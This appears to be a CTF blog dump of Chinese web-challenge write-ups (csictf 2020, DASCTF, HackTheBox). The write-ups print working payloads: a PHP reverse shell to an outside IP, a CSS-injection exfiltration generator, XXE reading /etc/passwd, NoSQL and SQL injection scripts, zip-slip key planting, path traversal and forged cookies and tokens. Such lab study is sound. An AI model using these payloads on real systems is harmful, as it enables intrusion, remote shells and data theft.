0x51ee(&#x27;0x5&#x27;))===_0x47df21[_0x51ee(&#x27;0x1&#x27;)](0xc,0xe))&#123;if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#x27;0xc&#x27;))===_0x47df21[_0x51ee(&#x27;0x1&#x27;)](0x7,0x9))&#123;if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#x27;0xd&#x27;))===_0x47df21[_0x51ee(&#x27;0x1&#x27;)](0xe,0x10))&#123;if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#x27;0x0&#x27;))===_0x47df21[_0x51ee(&#x27;0x1&#x27;)](0x2,0x4))return!![];&#125;&#125;&#125;&#125;&#125;&#125;&#125;return![];&#125; 用在线工具解密一下 http://www.jsnice.org/ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&#x27;use strict&#x27;;/** @type &#123;!Array&#125; */var _0x575c = [&quot;2-4&quot;, &quot;substring&quot;, &quot;4-7&quot;, &quot;getItem&quot;, &quot;deleteItem&quot;, &quot;12-14&quot;, &quot;0-2&quot;, &quot;setItem&quot;, &quot;9-12&quot;, &quot;^7M&quot;, &quot;updateItem&quot;, &quot;bb=&quot;, &quot;7-9&quot;, &quot;14-16&quot;, &quot;localStorage&quot;];(function(data, i) &#123; /** * @param &#123;number&#125; selected_image * @return &#123;undefined&#125; */ var validateGroupedContexts = function fn(selected_image) &#123; for (; --selected_image;) &#123; data[&quot;push&quot;](data[&quot;shift&quot;]()); &#125; &#125;; validateGroupedContexts(++i);&#125;)(_0x575c, 120);/** * @param &#123;string&#125; ballNumber * @param &#123;?&#125; opt_target * @return &#123;?&#125; */var _0x51ee = function PocketDropEvent(ballNumber, opt_target) &#123; /** @type &#123;number&#125; */ ballNumber = ballNumber - 0; var ball = _0x575c[ballNumber]; return ball;&#125;;/** * @param &#123;!Object&#125; results * @return &#123;?&#125; */function CheckPassword(results) &#123; /** @type &#123;!Array&#125; */ var easing = [_0x51ee(&quot;0xe&quot;), _0x51ee(&quot;0x3&quot;), _0x51ee(&quot;0x7&quot;), _0x51ee(&quot;0x4&quot;), _0x51ee(&quot;0xa&quot;)]; window[easing[0]][easing[2]](&quot;9-12&quot;, &quot;BE*&quot;); window[easing[0]][easing[2]](_0x51ee(&quot;0x2&quot;), _0x51ee(&quot;0xb&quot;)); window[easing[0]][easing[2]](_0x51ee(&quot;0x6&quot;), &quot;5W&quot;); window[easing[0]][easing[2]](&quot;16&quot;, _0x51ee(&quot;0x9&quot;)); window[easing[0]][easing[2]](_0x51ee(&quot;0x5&quot;), &quot;pg&quot;); window[easing[0]][easing[2]](&quot;7-9&quot;, &quot;+n&quot;); window[easing[0]][easing[2]](_0x51ee(&quot;0xd&quot;), &quot;4t&quot;); window[easing[0]][easing[2]](_0x51ee(&quot;0x0&quot;), &quot;$F&quot;); if (window[easing[0]][easing[1]](_0x51ee(&quot;0x8&quot;)) === results[_0x51ee(&quot;0x1&quot;)](9, 12)) &#123; if (window[easing[0]][easing[1]](_0x51ee(&quot;0x2&quot;)) === results[&quot;substring&quot;](4, 7)) &#123; if (window[easing[0]][easing[1]](_0x51ee(&quot;0x6&quot;)) === results[_0x51ee(&quot;0x1&quot;)](0, 2)) &#123; if (window[easing[0]][easing[1]](&quot;16&quot;) === results[_0x51ee(&quot;0x1&quot;)](16)) &#123; if (window[easing[0]][easing[1]](_0x51ee(&quot;0x5&quot;)) === results[_0x51ee(&quot;0x1&quot;)](12, 14)) &#123; if (window[easing[0]][easing[1]](_0x51ee(&quot;0xc&quot;)) === results[_0x51ee(&quot;0x1&quot;)](7, 9)) &#123; if (window[easing[0]][easing[1]](_0x51ee(&quot;0xd&quot;)) === results[_0x51ee(&quot;0x1&quot;)](14, 16)) &#123; if (window[easing[0]][easing[1]](_0x51ee(&quot;0x0&quot;)) === results[_0x51ee(&quot;0x1&quot;)](2, 4)) &#123; return !![]; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; return ![];&#125;; 其实可以直接看checkPassword函数，下面这一块应该是给元素赋值 12345678window[easing[0]][easing[2]](&quot;9-12&quot;, &quot;BE*&quot;);window[easing[0]][easing[2]](_0x51ee(&quot;0x2&quot;), _0x51ee(&quot;0xb&quot;));window[easing[0]][easing[2]](_0x51ee(&quot;0x6&quot;), &quot;5W&quot;);window[easing[0]][easing[2]](&quot;16&quot;, _0x51ee(&quot;0x9&quot;));window[easing[0]][easing[2]](_0x51ee(&quot;0x5&quot;), &quot;pg&quot;);window[easing[0]][easing[2]](&quot;7-9&quot;, &quot;+n&quot;);window[easing[0]][easing[2]](_0x51ee(&quot;0xd&quot;), &quot;4t&quot;);window[easing[0]][easing[2]](_0x51ee(&quot;0x0&quot;), &quot;$F&quot;); 下面这一块就是检查密码 123456789101112131415161718if (window[easing[0]][easing[1]](_0x51ee(&quot;0x8&quot;)) === results[_0x51ee(&quot;0x1&quot;)](9, 12)) &#123; if (window[easing[0]][easing[1]](_0x51ee(&quot;0x2&quot;)) === results[&quot;substring&quot;](4, 7)) &#123; if (window[easing[0]][easing[1]](_0x51ee(&quot;0x6&quot;)) === results[_0x51ee(&quot;0x1&quot;)](0, 2)) &#123; if (window[easing[0]][easing[1]](&quot;16&quot;) === results[_0x51ee(&quot;0x1&quot;)](16)) &#123; if (window[easing[0]][easing[1]](_0x51ee(&quot;0x5&quot;)) === results[_0x51ee(&quot;0x1&quot;)](12, 14)) &#123; if (window[easing[0]][easing[1]](_0x51ee(&quot;0xc&quot;)) === results[_0x51ee(&quot;0x1&quot;)](7, 9)) &#123; if (window[easing[0]][easing[1]](_0x51ee(&quot;0xd&quot;)) === results[_0x51ee(&quot;0x1&quot;)](14, 16)) &#123; if (window[easing[0]][easing[1]](_0x51ee(&quot;0x0&quot;)) === results[_0x51ee(&quot;0x1&quot;)](2, 4)) &#123; return !![]; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; return ![]; 但是可以看到密码被拆分成很多部分，而且不是按0，1，2，3…顺序来的。_0x51ee我们不知道是什么变量，但是可以通过这两部分结合来看，发现元素赋值和检查密码的顺序是一样的，也就是说9-12位是BE*，4-7位是_0x51ee(&quot;0xb&quot;)，并且4-7对应_0x51ee(&quot;0x2&quot;)，再回过头来看一下_0x575c数组，刚好_0x575c[0x02]=4-7。以此类推，可以得到密码5W$Fbb=+nBE*pg4t^7M。 Baby Count 考察文件包含+命令执行 robots.txt提示有一个checkpass.php文件，并且可以利用wrapper文件包含 checkpass.php 123456&lt;?php$password = &quot;w0rdc0unt123&quot;;// Cookie password.echo &quot;IMPORTANT!!! The page is still under development. This has a secret, do not push this page.&quot;;header(&#x27;Location: /&#x27;); wc.php 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;wc as a service&lt;/title&gt; &lt;style&gt; html, body &#123; overflow: none; max-height: 100vh; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body style=&quot;height: 100vh; text-align: center; background-color: black; color: white; display: flex; flex-direction: column; justify-content: center;&quot;&gt; &lt;?php ini_set(&#x27;max_execution_time&#x27;, 5); if ($_COOKIE[&#x27;password&#x27;] !== getenv(&#x27;PASSWORD&#x27;)) &#123; setcookie(&#x27;password&#x27;, &#x27;PASSWORD&#x27;); die(&#x27;Sorry, only people from csivit are allowed to access this page.&#x27;); &#125; ?&gt; &lt;h1&gt;Character Count as a Service&lt;/h1&gt; &lt;form&gt; &lt;input type=&quot;hidden&quot; value=&quot;wc.php&quot; name=&quot;file&quot;&gt; &lt;textarea style=&quot;border-radius: 1rem;&quot; type=&quot;text&quot; name=&quot;text&quot; rows=30 cols=100&gt;&lt;/textarea&gt;&lt;br /&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt; &lt;?php if (isset($_GET[&quot;text&quot;])) &#123; $text = $_GET[&quot;text&quot;]; echo &quot;&lt;h2&gt;The Character Count is: &quot; . exec(&#x27;printf \\&#x27;&#x27; . $text . &#x27;\\&#x27; | wc -c&#x27;) . &quot;&lt;/h2&gt;&quot;; &#125; ?&gt;&lt;/body&gt;&lt;/html&gt; 把cookie中的password改成w0rdc0unt123，就可以输入text了 来看一下后端的处理逻辑： 123456&lt;?php if (isset($_GET[&quot;text&quot;])) &#123; $text = $_GET[&quot;text&quot;]; echo &quot;&lt;h2&gt;The Character Count is: &quot; . exec(&#x27;printf \\&#x27;&#x27; . $text . &#x27;\\&#x27; | wc -c&#x27;) . &quot;&lt;/h2&gt;&quot;; &#125;?&gt; 很明显$text参数是可以注入的。payload如下： 1&#39;; whoami # 反弹一个shell 1&#39;; php -r &#39;$sock&#x3D;fsockopen(&quot;47.97.199.89&quot;,11000);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39; # 全局查找一下flag文件 /ctf/system/of/a/down/flag.txt显示权限不够 README里面有一段Hash加密的值，送到工具里面去识别是MD5加密，放到网上去跑没有拍出来，看其他的wp是csictf 切换成ctf用户 The Confused Deputy 考察CSS注入 脚本生成payload 123456f = open(&quot;poc.css&quot;, &quot;w&quot;)dic = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;-&quot;for i in dic: payload = &#x27;&#x27;&#x27;#000000;&#125; input[type=password][value^=&quot;&#x27;&#x27;&#x27; + i + &#x27;&#x27;&#x27;&quot;]&#123;background-image:url(&quot;http://47.97.199.89:8888/?flag=&#x27;&#x27;&#x27; + i + &#x27;&#x27;&#x27;&quot;);&#125; &#x27;&#x27;&#x27; f.write(payload + &quot;\\n&quot;)f.close() 放到burp intrude模块爆破 在VPS上监听端口 逐次爆破各个位置得到flag。 File Library 题目直接给了源代码server.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566const express = require(&#x27;express&#x27;);const path = require(&#x27;path&#x27;);const fs = require(&#x27;fs&#x27;);const app = express();const PORT = process.env.PORT || 3000;app.listen(PORT, () =&gt; &#123; console.log(`Listening on port $&#123;PORT&#125;`);&#125;);app.get(&#x27;/getFile&#x27;, (req, res) =&gt; &#123; let &#123; file &#125; = req.query; if (!file) &#123; res.send(`file=$&#123;file&#125;\\nFilename not specified!`); return; &#125; try &#123; if (file.includes(&#x27; &#x27;) || file.includes(&#x27;/&#x27;)) &#123; res.send(`file=$&#123;file&#125;\\nInvalid filename!`); return; &#125; &#125; catch (err) &#123; res.send(&#x27;An error occured!&#x27;); return; &#125; if (!allowedFileType(file)) &#123; res.send(`File type not allowed`); return; &#125; if (file.length &gt; 5) &#123; file = file.slice(0, 5); &#125; const returnedFile = path.resolve(__dirname + &#x27;/&#x27; + file); fs.readFile(returnedFile, (err) =&gt; &#123; if (err) &#123; if (err.code != &#x27;ENOENT&#x27;) console.log(err); res.send(&#x27;An error occured!&#x27;); return; &#125; res.sendFile(returnedFile); &#125;);&#125;);app.get(&#x27;/*&#x27;, (req, res) =&gt; &#123; res.sendFile(__dirname + &#x27;/index.html&#x27;);&#125;);function allowedFileType(file) &#123; const format = file.slice(file.indexOf(&#x27;.&#x27;) + 1); if (format == &#x27;js&#x27; || format == &#x27;ts&#x27; || format == &#x27;c&#x27; || format == &#x27;cpp&#x27;) &#123; return true; &#125; return false;&#125; 页面内还给了两个提示： ok.js 123456789101112131415161718192021222324252627console.log(&#x27;Welcome to my sample javascript program!&#x27;);// Let&#x27;s checkout some funny issues in JS![] == ![]; // -&gt; truefalse == []; // -&gt; truefalse == ![]; // -&gt; trueconsole.log(&quot;b&quot; + &quot;a&quot; + +&quot;a&quot; + &quot;a&quot;); // -&gt; baNaNaNaN === NaN; // -&gt; false(![] + [])[+[]] + (![] + [])[+!+[]] + ([![]] + [][[]])[+!+[] + [+[]]] + (![] + [])[!+[] + !+[]];// -&gt; &#x27;fail&#x27;document.all instanceof Object; // -&gt; truetypeof document.all; // -&gt; &#x27;undefined&#x27;Number.MIN_VALUE &gt; 0; // -&gt; true[1, 2, 3] + [4, 5, 6]; // -&gt; &#x27;1,2,34,5,6&#x27;console.log(&#x27;View more: https://github.com/denysdovhan/wtfjs&#x27;); a.cpp 1234#include &lt;stdlib.h&gt;int main() &#123; system(&quot;cat flag.txt&quot;);&#125; 应该就是尝试利用server.js读取flag.txt。 审计源代码，主要是由两个关键的处理： 文件类型必须是js, ts, c, cpp 1234if (!allowedFileType(file)) &#123; res.send(`File type not allowed`); return; &#125; 取文件名的前五位 123if (file.length &gt; 5) &#123; file = file.slice(0, 5); &#125; 最后用path.resolve拼接成最终路径。 payload就直接给出来了，反正我是没想到的。。。 1&#x2F;getFile?file[]&#x3D;f&amp;file[]&#x3D;4&amp;file[]&#x3D;k&amp;file[]&#x3D;e&amp;file[]&#x3D;&#x2F;..&#x2F;flag.txt&amp;file[]&#x3D;.&amp;file[]&#x3D;js 利用数组来绕过，node.js会解析成 1file[] &#x3D; [&quot;f&quot;,&quot;4&quot;,&quot;k&quot;,&quot;e&quot;,&quot;&#x2F;..&#x2F;flag.txt&quot;,&quot;.&quot;,&quot;js&quot;] 这样就可以绕过后缀名和文件长度的检查。 这里还利用了path.resolve的一个特性 The method creates absolute path from right to left until an absolute path is constructed 该方法从右到左创建绝对路径，直到构造了绝对路径。 也就是执行完下面的语句 1const returnedFile = path.resolve(__dirname + &#x27;/&#x27; + [&quot;f&quot;,&quot;4&quot;,&quot;k&quot;,&quot;e&quot;,&quot;/../flag.txt&quot;]); 结果就是__dirname+'/'+'/../flag.txt' The Usual Suspects 考察tornado模板注入+生成cookie secret 很明显存在模板注入漏洞，用&#123;&#123;7*'7'&#125;&#125;验证一下 查看当前网页的cookie 1&quot;2|1:0|10:1595941408|5:admin|8:ZmFsc2U&#x3D;|bfe7af9eba0d5c6717c341e50fd8660db4e4fccbce187a20c1236205df3e3171&quot; ZmFsc2U=是false的base64编码 题目提示要拿secret，用&#123;&#123;config&#125;&#125;直接报错 Google一下tornado cookie secret https://www.tornadoweb.org/en/stable/web.html#tornado.web.Application.settings 用global()查看当前全局变量 用application.settings获取cookie_secret 用脚本生成tornado cookies 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import hmacimport hashlibfrom typing import ( Dict, Any, Union, Optional, Awaitable, Tuple, List, Callable, Iterable, Generator, Type, cast, overload,)_UTF8_TYPES = (bytes, type(None))unicode_type = strdef utf8(value: Union[None, str, bytes]) -&gt; Optional[bytes]: # noqa: F811 &quot;&quot;&quot;Converts a string argument to a byte string. If the argument is already a byte string or None, it is returned unchanged. Otherwise it must be a unicode string and is encoded as utf8. &quot;&quot;&quot; if isinstance(value, _UTF8_TYPES): return value if not isinstance(value, unicode_type): raise TypeError(&quot;Expected bytes, unicode, or None; got %r&quot; % type(value)) return value.encode(&quot;utf-8&quot;)def _create_signature_v2(secret: Union[str, bytes], s: bytes) -&gt; bytes: hash = hmac.new(utf8(secret), digestmod=hashlib.sha256) hash.update(utf8(s)) return utf8(hash.hexdigest())def format_field(s: Union[str, bytes]) -&gt; bytes: return utf8(&quot;%d:&quot; % len(s)) + utf8(s)to_sign = b&quot;|&quot;.join( [ b&quot;2&quot;, format_field(&quot;0&quot;), format_field(&quot;1595249713&quot;), format_field(&quot;admin&quot;), format_field(&quot;dHJ1ZQ==&quot;), b&quot;&quot;, ] )print(to_sign + _create_signature_v2(&#x27;MangoDB\\n&#x27;,to_sign)) 用这个更换原始的cookie，拿到flag。 CCC 考察文件包含+JWT 在右侧菜单栏中Our Admins和Login不能直接点开，但是通过源代码可以看到链接了两个地址：/adminNames和/login。 访问/adminNames直接下载了一个文件，里面是一个github仓库地址：https://github.com/csivitu/authorized_users/blob/master 访问/login是一个登录界面，随便输入admin:admin，返回包中有一个JWT token 拿到jwt.io解码一下 123456&#123; &quot;username&quot;: &quot;nqzva&quot;, &quot;password&quot;: &quot;nqzva&quot;, &quot;admin&quot;: &quot;snyfr&quot;, &quot;iat&quot;: 1595922746&#125; nqzva用ROT13解密得到admin，snyfr用ROT13解密得到flase，并且不管输入什么用户名和密码，都是相同的token，那么现在就需要拿到secret。 回头再来看/adminNames，发现了一个文件包含 那么久可以读取node.js的环境变量../.env，拿到secret 1JWT_SECRET&#x3D;Th1sSECr3TMu5TN0Tb3L43KEDEv3RRRRRR!!1 生成token 通过扫描目录得到/admin，访问返回： 1&#123;&quot;success&quot;:false,&quot;message&quot;:&quot;Invalid Token, Headers?&quot;&#125; 通过Authorization字段发送请求包 ROT13解密得到flag。 Linux AKA 大部分的命令都设置了alias，但是bash命令没有。 find32 感觉这题脑洞还是挺大的。。 SSH登录后有很多文件，内容也是随机的字母，32在ASCII码中代表空格字符，那么在CTF的flag中就是_来代替。 写一个脚本传到靶机上去 123456789101112131415import ospath = &quot;/user1/&quot; files = os.listdir(path)for file in files: if not os.path.isdir(file): try: with open(path+file, &#x27;r&#x27;) as f: print(&#x27;[+]&#x27; + path + file) for line in f.readlines(): if &#x27;_&#x27; in line: print(file) except FileNotFoundError: print(&#x27;[-]&#x27; + file) continue 打开这个文件，提示要用user2来登录 ssh登录之后，当前目录下有几个文件，文件大小类似，用diff命令一个个比较一下 HTB 0x01 nmap扫描出5001端口运行ftp服务，直接anonymous登录拿flag。 HTB 0x02~0x05 nmap扫描端口 1222&#x2F;tcp open ssh3000&#x2F;tcp open http 先来看看3000端口，访问http://34.93.215.188:3000/，有一个登录框 先用1 or 1=1 , 1' or 1=1 --，';-#$()来测试是不是SQL注入，结果直接返回No user with username: ';-#$() and password: ';-#$()。再用burp fuzz一下常用的payload发现是NoSQL注入，直接用万能密码： 1username[$ne]&#x3D;ca01h&amp;password[$ne]&#x3D;ca01h 具体原理可以参考另外一篇博文：NoSQL注入之MongoDB 登录成功后跳转到上传页面 上传一个zip文件，再查看源代码，得到HTB 0x02的flag 看到可以用不用的数据格式提交查询，有一个是XML，用下面的payload看看是否存在XXE注入 1&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#x27;file:///etc/passwd&#x27;&gt;]&gt;&lt;root&gt;&amp;test;&lt;/root&gt; 发现/etc/passwd暗藏一个gist地址：https://gist.github.com/sivel/c68f601137ef9063efd7 是一个管理SSH Key的工具，里面提到了两个文件，/usr/local/bin/userkeys.sh和/etc/sshd/sshd_config。分别用上面的XXE payload看一下文件内容 /etc/sshd/sshd_config 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121# This is the sshd server system-wide configuration file. See# sshd_config(5) for more information.# This sshd was compiled with PATH&#x3D;&#x2F;usr&#x2F;bin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;sbin# The strategy used for options in the default sshd_config shipped with# OpenSSH is to specify options with their default value where# possible, but leave them commented. Uncommented options override the# default value.Include &#x2F;etc&#x2F;ssh&#x2F;sshd_config.d&#x2F;*.conf#Port 22#AddressFamily any#ListenAddress 0.0.0.0#ListenAddress ::#HostKey &#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key#HostKey &#x2F;etc&#x2F;ssh&#x2F;ssh_host_ecdsa_key#HostKey &#x2F;etc&#x2F;ssh&#x2F;ssh_host_ed25519_key# Ciphers and keying#RekeyLimit default none# Logging#SyslogFacility AUTH#LogLevel INFO# Authentication:#LoginGraceTime 2m#PermitRootLogin prohibit-password#StrictModes yes#MaxAuthTries 6#MaxSessions 10#PubkeyAuthentication yes# Expect .ssh&#x2F;authorized_keys2 to be disregarded by default in future.#AuthorizedKeysFile\\t.ssh&#x2F;authorized_keys .ssh&#x2F;authorized_keys2#AuthorizedPrincipalsFile none# csictf&#123;cu5t0m_4uth0rizat10n&#125;AuthorizedKeysCommand &#x2F;usr&#x2F;local&#x2F;bin&#x2F;userkeys.shAuthorizedKeysCommandUser nobody# For this to work you will also need host keys in &#x2F;etc&#x2F;ssh&#x2F;ssh_known_hosts#HostbasedAuthentication no# Change to yes if you don&#39;t trust ~&#x2F;.ssh&#x2F;known_hosts for# HostbasedAuthentication#IgnoreUserKnownHosts no# Don&#39;t read the user&#39;s ~&#x2F;.rhosts and ~&#x2F;.shosts files#IgnoreRhosts yes# To disable tunneled clear text passwords, change to no here!PasswordAuthentication no#PermitEmptyPasswords no# Change to yes to enable challenge-response passwords (beware issues with# some PAM modules and threads)ChallengeResponseAuthentication no# Kerberos options#KerberosAuthentication no#KerberosOrLocalPasswd yes#KerberosTicketCleanup yes#KerberosGetAFSToken no# GSSAPI options#GSSAPIAuthentication no#GSSAPICleanupCredentials yes#GSSAPIStrictAcceptorCheck yes#GSSAPIKeyExchange no# Set this to &#39;yes&#39; to enable PAM authentication, account processing,# and session processing. If this is enabled, PAM authentication will# be allowed through the ChallengeResponseAuthentication and# PasswordAuthentication. Depending on your PAM configuration,# PAM authentication via ChallengeResponseAuthentication may bypass# the setting of \\&quot;PermitRootLogin without-password\\&quot;.# If you just want the PAM account and session checks to run without# PAM authentication, then enable this but set PasswordAuthentication# and ChallengeResponseAuthentication to &#39;no&#39;.UsePAM yes#AllowAgentForwarding yes#AllowTcpForwarding yes#GatewayPorts noX11Forwarding yes#X11DisplayOffset 10#X11UseLocalhost yes#PermitTTY yesPrintMotd no#PrintLastLog yes#TCPKeepAlive yes#PermitUserEnvironment no#Compression delayed#ClientAliveInterval 0#ClientAliveCountMax 3#UseDNS no#PidFile &#x2F;var&#x2F;run&#x2F;sshd.pid#MaxStartups 10:30:100#PermitTunnel no#ChrootDirectory none#VersionAddendum none# no default banner path#Banner none# Allow client to pass locale environment variablesAcceptEnv LANG LC_*# override default of no subsystemsSubsystem\\tsftp\\t&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;sftp-server# Example of overriding settings on a per-user basis#Match User anoncvs#\\tX11Forwarding no#\\tAllowTcpForwarding no#\\tPermitTTY no#\\tForceCommand cvs server&quot; 其中包含了HTB 0x05的flag：csictf&#123;cu5t0m_4uth0rizat10n&#125; 接着看/usr/local/bin/userkeys.sh 1234567#!&#x2F;bin&#x2F;bashif [ \\&quot;$1\\&quot; &#x3D;&#x3D; \\&quot;csictf\\&quot; ]; then cat &#x2F;home&#x2F;administrator&#x2F;uploads&#x2F;keys&#x2F;*else echo \\&quot;\\&quot;fi 题目的意思应该要我们上传一个Public Key到/home/administrator/uploads/keys/，然后用ssh登录，能上传的地方就只有之前那个zip upload。看赛后的wp，这里用到的是zip slip漏洞：Zip Slip Vulnerability 先在本机上生成一个ssh public key，然后特殊的zip压缩文件，上传 123$ ssh-keygen -t rsa #filename:my_key$ 7z a zip-slip.zip my_key.pub$ 7z rn zip-slip.zip my_key.pub &#39;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;home&#x2F;administrator&#x2F;uploads&#x2F;keys&#x2F;dunsp4rce.pub&#39; 返回&#123;success: true&#125; 再ssh登录，在当前目录下得到HTB 0x03的flag 接着就是去/home目录下找各种文件了 在/home/administrator/website/models/db.js中发现HTB 0x06的flag。 并且还给出了mongodb登录的口令 拿到HTB 0x04的flag。 Reference https://dunsp4rce.github.io/csictf-2020/ https://github.com/team0se7en/CTF-Writeups/tree/master/csictf2020/","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"}]},{"title":"DASCTF2020七月赛","date":"2020-07-25T09:10:59.000Z","path":"Web_security/ctf_writeup/19.DASCTF2020七月赛/","text":"DASCTF七月赛 Web Writeup EzFileInclude 考点 文件包含 解题 做的时候这道题真的是。。一言难尽 F12可以看到主页图片的链接http://183.129.189.60:10009/image.php?t=XXXXXX&amp;f=XXXXXXX 参数t是时间戳，参数f是要包含的文件名base64编码，尝试直接读image.php和index.php都没有任何回显，应该是前面拼接了路径，比如说/var/www/html/img/，而且过滤了../等路径穿越的字符，并且wrapper等手段的。 想了半天感觉这样应该是绝对安全的。。结果后来发现，如果f参数的开头给出一个目录再穿越就可以绕过waf了。 脚本： 1234567891011import requestsimport timeimport base64URL = &#x27;http://183.129.189.60:10009/image.php&#x27;timestamp = int(time.time())payload = &#x27;gqy.jpg/../../../../../flag&#x27;params = &#123;&#x27;t&#x27;: timestamp, &#x27;f&#x27;: base64.b64encode(payload.encode(&#x27;utf-8&#x27;))&#125;r = requests.get(url=URL, params=params)print(r.text) 顺便看一下源码 123456789101112131415161718192021222324&lt;?php if(!isset($_GET[&#x27;t&#x27;]) || !isset($_GET[&#x27;f&#x27;]))&#123; echo &quot;you miss some parameters&quot;; exit(); &#125; $timestamp = time(); if(abs($_GET[&#x27;t&#x27;] - $timestamp) &gt; 10)&#123; echo &quot;what&#x27;s your time?&quot;; exit(); &#125; $file = base64_decode($_GET[&#x27;f&#x27;]); if(substr($file, 0, strlen(&quot;/../&quot;)) === &quot;/../&quot; || substr($file, 0, strlen(&quot;../&quot;)) === &quot;../&quot; || substr($file, 0, strlen(&quot;./&quot;)) === &quot;./&quot; || substr($file, 0, strlen(&quot;/.&quot;)) === &quot;/.&quot; || substr($file, 0, strlen(&quot;//&quot;)) === &quot;//&quot;) &#123; echo &#x27;You are not allowed to do that.&#x27;; &#125; else&#123; echo file_get_contents(&#x27;/var/www/html/img/&#x27;.$file); &#125;?&gt; SQLi 考点 bypass information_schema 解题 太菜了。。第二题就不会了。 赛后看y1ng师傅的writeup：https://www.gem-love.com/ctf/2514.html 过滤了关键字 1return preg_match(&quot;&#x2F;;|benchmark|\\^|if|[\\s]|in|case|when|sleep|auto|desc|stat|\\||lock|or|and|&amp;|like|-|&#96;&#x2F;i&quot;, $id); 用sys.x$schema_flattened_keys来绕过information_schema 有回显直接联合注入 1100%27&#x2F;**&#x2F;union&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;group_concat(table_name),2,3&#x2F;**&#x2F;FROM&#x2F;**&#x2F;&#x2F;**&#x2F;sys.x$schema_flattened_keys&#x2F;**&#x2F;WHERE&#x2F;**&#x2F;table_schema&#x3D;&#39;sqlidb&#39;&#x2F;**&#x2F;GROUP&#x2F;**&#x2F;BY&#x2F;**&#x2F;table_name&#x2F;**&#x2F;limit&#x2F;**&#x2F;0,1%23 另外也可以盲注，把表名给注出来 12345678910111213141516171819202122232425#!/usr/bin/env python3#-*- coding:utf-8 -*-#__author__: 颖奇L&#x27;Amore www.gem-love.comimport requests as reqimport time as timport base64 as bimport stringalpa = string.ascii_letters + string.digitsres = &#x27;&#x27;#库名 利用limit注入 sqlidb# http://183.129.189.60:10004/?id=1%27limit/**/1,1/**/PROCEDURE/**/ANALYSE(1)%23#表名 flllaaagggpayload = &#x27;&#x27;&#x27;SELECT group_concat(table_name) FROM sys.x$schema_flattened_keys WHERE table_schema=&#x27;sqlidb&#x27; GROUP BY table_name limit 0,1&#x27;&#x27;&#x27;for i in range(1,100): for char in alpa: host = &#x27;&#x27;&#x27;http://183.129.189.60:10004/?id=1&#x27;=(substr((&#123;payload&#125;),&#123;i&#125;,1)=&#x27;&#123;char&#125;&#x27;)%23&#x27;&#x27;&#x27;.format(payload=payload.replace(&#x27; &#x27;,&#x27;/**/&#x27;), i=i, char=char) r = req.get(host) if r&#x27;admin666&#x27; in r.text: res += char print(&quot;found it: &quot;+res) break t.sleep(0.2) 再用联合查询获得flag 1100&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*,1&#x2F;**&#x2F;from&#x2F;**&#x2F;flllaaaggg%23 Homebrew Dubbo v2 待填坑。。。 等一手下个星期找老板的直播讲解。","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"}]},{"title":"HackTheBox-Challenge-Web","date":"2020-07-15T03:31:00.000Z","path":"Target_drone/HackTheBox/0.HackTheBox-Challenge-Web/","text":"HackTheBox Challenge Web I know Mag1k 打开题目有登录注册的页面，先随便注册一个账号 有一个cookie很奇怪，感觉像是base64编码 这个地方就涉及到Padding Oracle attacks（填充提示攻击），很多年前的攻击方式了，《白帽子讲web安全》中有提到过这种攻击手法。 直接使用工具padbuster。 1padbuster http:&#x2F;&#x2F;docker.hackthebox.eu:30921&#x2F;profile.php Y5MXsRyBPFqBPlu3z8p7S2OO%2FGe9sLQ5X1khXeMdHfkcsgbngE3xDA%3D%3D 8 --cookies iknowmag1k&#x3D;Y5MXsRyBPFqBPlu3z8p7S2OO%2FGe9sLQ5X1khXeMdHfkcsgbngE3xDA%3D%3D 其中这个命令参数8指的是解密的块大小，一共只有三个值：8，16，32","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"}]},{"title":"PHP复杂变量解析","date":"2020-07-14T00:43:52.000Z","path":"Web_security/php_related/11.PHP复杂变量解析/","text":"PHP复杂变量解析学习 0x01 基础知识 单引号和双引号的区别 1234&lt;?php$test=&#x27;hello world！&#x27;;echo &quot;$test&quot;;echo &#x27;$test&#x27;; 输出的结果是 12hello world!$test 也就是说，PHP中的单引号会直接解析成字符串，而如果是双引号，那么PHP会首先去看双引号里面有没有变量，如果有变量的话那么会先进行变量解析，即替换成它的值。 变量的识别 